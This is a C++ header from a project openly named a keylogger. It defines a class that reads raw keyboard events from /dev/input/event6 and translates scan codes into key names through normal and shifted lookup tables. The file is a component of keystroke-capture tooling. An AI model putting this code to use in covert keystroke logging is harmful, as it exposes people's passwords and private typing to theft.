#pragma once

#include <keylogger/hooks/events.hpp>

#include <functional>

#define KEYBOARD_EVENT_PATH "/dev/input/event6"

struct KeyboardEvent: public Event {
    std::string key;
};

class KeyboardEvents:
        public Events {
public:
    KeyboardEvents() : Events(KEYBOARD_EVENT_PATH) {}

    void ConnectHandler(std::function<void(Event &)> callback) override;

private:
    static inline std::string keyNames[] = {
            "UNKNOWN_KEY", "<ESC>",
            "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
            "<Backspace>", "<Tab>",
            "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
            "[", "]", "<Enter>", "<LCtrl>",
            "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
            "'", "`", "<LShift>",
            "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
            "<RShift>",
            "<KP*>",
            "<LAlt>", "UNKNOWN_KEY", "<CapsLock>",
            "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
            "<NumLock>", "<ScrollLock>",
            "<KP7>", "<KP8>", "<KP9>",
            "<KP->",
            "<KP4>", "<KP5>", "<KP6>",
            "<KP+>",
            "<KP1>", "<KP2>", "<KP3>", "<KP0>",
            "<KP.>",
            "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY",
            "<F11>", "<F12>",
            "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY",
            "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "UNKNOWN_KEY",
            "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
            "<PageDown>", "<Insert>", "<Delete>"
    };

    static inline std::string shiftedKeyNames[] = {
            "UNKNOWN_KEY", "<ESC>",
            "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
            "<Backspace>", "<Tab>",
            "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
            "{", "}", "<Enter>", "<LCtrl>",
            "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
            "\"", "~", "<LShift>",
            "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
            "<RShift>",
            "<KP*>",
            "<LAlt>", "UNKNOWN_KEY", "<CapsLock>",
            "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
            "<NumLock>", "<ScrollLock>",
            "<KP7>", "<KP8>", "<KP9>",
            "<KP->",
            "<KP4>", "<KP5>", "<KP6>",
            "<KP+>",
            "<KP1>", "<KP2>", "<KP3>", "<KP0>",
            "<KP.>",
            "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY",
            "<F11>", "<F12>",
            "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY", "UNKNOWN_KEY",
            "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "UNKNOWN_KEY",
            "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
            "<PageDown>", "<Insert>", "<Delete>"
    };
};
